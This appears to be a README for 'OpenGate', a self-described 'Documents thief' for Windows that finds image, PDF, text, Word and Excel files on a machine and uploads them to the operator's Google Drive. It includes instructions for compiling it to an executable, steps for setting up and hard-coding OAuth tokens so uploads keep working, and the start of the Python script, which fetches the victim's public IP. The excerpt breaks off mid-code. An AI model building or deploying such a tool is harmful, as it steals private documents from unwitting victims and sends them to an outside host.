# OpenGate
OpenGate "Documents thief" searching for images , pdf .text file , word  and Excel ,  extension and send to Google Drive
* for windows operating system compile to exe 
* user can use pyinstaller or py2exe 'for py2exe uset setup.py file
* have to anable api 'OAuth 2.0 Playground'
* 
### how to enable OAuth 2.0 Playground
* the idea of use oauth 2.0 playground is the file  will be large  file so can not send it by email so-
- the best options to use auth 2.0 playground google api 'Googel Drive' so can create file on the google drive 
- and store it in google drive 

 * [Google Ads API Auth Series - Web Flow with the OAuth Playground](https://www.youtube.com/watch?v=KFICa7Ngzng)
 * [Using OAuth 2.0 to Access Google APIs](https://developers.google.com/identity/protocols/oauth2)
 * gentrate the access Token copy and past it 
 ```python
 Token    = ""#add the access Token hare
 ```
 ### handel with ipa Token Expire 
with use access Token will get expire after 1 hour , the OpenGate will requsts new access Token Automaticly if the access Token expire fot that have to hared code client_id , client_sctrite , refrech Token ,
 
```python 
client_id     = ''#add the client_id  hare
client_secret = ''#add the client_secret hare
refresh_token = ''#add the refresh_token  hare
```
### Eplan
```python

#!/usr/bin/env python3

import os
import shutil
import base64
import json
import requests
import socket
import urllib.request

Token         = "ya29.a0ARrdaM9XO9KvfMzshrDlxJTO6HMCyy5EIaMNduS2gnPamRk1KgoTAj-KSE1zJ_bW3s0xbbK7vjoWYMy5ZRWbtfZbLF0flz4uX58GXqkbNFC3iBXeJ3meGIoILJwuA2dH-7s7yCpnTuBuBYsZOGbpt0J6USo"# add the Token hare
client_id     = '40656873737638192.apps.googleusercontent.com'#add the client_id  hare
client_secret = 'kPcAZ9ICd4ldKE677fhnrjoe99eijejhrr-kijejjejjejjejjr0'#add the client_secret hare
refresh_token = '//04_5VB6CflruWCgYIARAAGAQSNwF-L9IrkPcAZ9ICd4ldKE677fhnrjoe99eijejhrr-kijejjejjejjejjr00jwjjwjjwjjwjjj' # add refreh Token hare
try:
    public_ip  = urllib.request.urlopen('http://api.ipify.org').read().decode('utf8')
```
